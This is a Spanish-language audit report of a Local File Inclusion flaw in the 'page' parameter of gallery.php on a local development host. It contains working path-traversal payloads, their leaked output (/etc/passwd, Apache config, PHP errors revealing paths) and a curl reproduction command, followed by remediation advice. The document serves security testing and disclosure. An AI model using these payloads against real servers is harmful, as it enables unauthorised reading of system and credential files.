# Informe simple de auditoría LFI - http://web.dev.local:8081

## Resultado

Se confirmó una vulnerabilidad de **Local File Inclusion (LFI)** en el endpoint:

- `http://web.dev.local:8081/gallery.php?page=...`

El parámetro `page` acepta rutas controladas por el usuario y permite incluir archivos locales del sistema mediante path traversal.

## Hallazgo

### LFI en `gallery.php?page`

**Severidad:** Alta

**URL vulnerable:**

```text
http://web.dev.local:8081/gallery.php?page=../../../../etc/passwd
```

## Evidencia de explotación

### 1. Lectura de `/etc/passwd`

**Payload:**

```text
http://web.dev.local:8081/gallery.php?page=../../../../etc/passwd
```

**Fragmento observado:**

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

### 2. Lectura de configuración de Apache

**Payload:**

```text
http://web.dev.local:8081/gallery.php?page=../../../../etc/apache2/apache2.conf
```

**Fragmento observado:**

```text
/etc/apache2/
|-- apache2.conf
|   `--  ports.conf
...
* apache2.conf is the main configuration file (this file).
```

### 3. Divulgación de ruta interna del servidor

**Payload:**

```text
http://web.dev.local:8081/gallery.php?page=../../../../proc/self/environ
```

**Fragmento observado:**

```text
Warning: include(/proc/702/environ): Failed to open stream: Permission denied in /var/www/html/gallery.php on line 104
Warning: include(): Failed opening '../../../../proc/self/environ' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/gallery.php on line 104
```

Esto demuestra:

- lectura arbitraria de archivos locales
- exposición de errores internos de PHP
- revelación de ruta local del código vulnerable: `/var/www/html/gallery.php`

## Impacto

Un atacante remoto no autenticado podría:

- leer archivos sensibles del sistema
- obtener configuración del servidor web
- revelar rutas internas y detalles del entorno
- facilitar ataques posteriores contra la infraestructura o la aplicación

## Reproducción mínima

```bash
curl -s 'http://web.dev.local:8081/gallery.php?page=../../../../etc/passwd'
```

Indicador esperado:

```text
root:x:0:0:root:/root:/bin/bash
```

## Recomendaciones

1. Sustituir la inclusión dinámica por una lista blanca de identificadores permitidos.
2. No concatenar rutas controladas por el usuario en `include` o funciones equivalentes.
3. Si el patrón de archivos dinámicos es imprescindible, validar con `realpath()` y comprobar que la ruta final queda dentro del directorio autorizado.
4. Desactivar `display_errors` en producción para evitar divulgación de rutas internas.
5. Revisar permisos del sistema y exposición de archivos sensibles accesibles por el proceso web.

## Conclusión

La aplicación es **vulnerable a LFI** a través del parámetro `page` de `gallery.php`. La vulnerabilidad fue **explotada con éxito** para leer archivos locales del sistema y obtener información sensible del entorno.
